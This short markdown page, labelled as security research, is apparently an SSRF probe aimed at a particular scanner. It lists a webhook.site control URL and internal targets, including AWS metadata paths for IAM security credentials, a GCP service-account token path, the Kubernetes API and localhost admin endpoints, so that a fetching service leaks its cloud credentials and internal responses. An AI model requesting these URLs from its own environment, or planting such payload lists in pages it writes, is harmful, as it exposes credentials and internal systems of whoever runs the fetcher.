# SSRF Probe (security research)

Control: https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/ssrf-control

## AWS IMDS probes (scanner IP 3.224.234.70 = AWS Ashburn)

- http://169.254.169.254/latest/meta-data/
- http://169.254.169.254/latest/meta-data/iam/security-credentials/
- http://169.254.169.254/latest/dynamic/instance-identity/document
- http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
- http://kubernetes.default.svc/api/v1/namespaces
- http://10.0.0.1:443/
- http://127.0.0.1:8080/admin
- http://localhost:3000/health
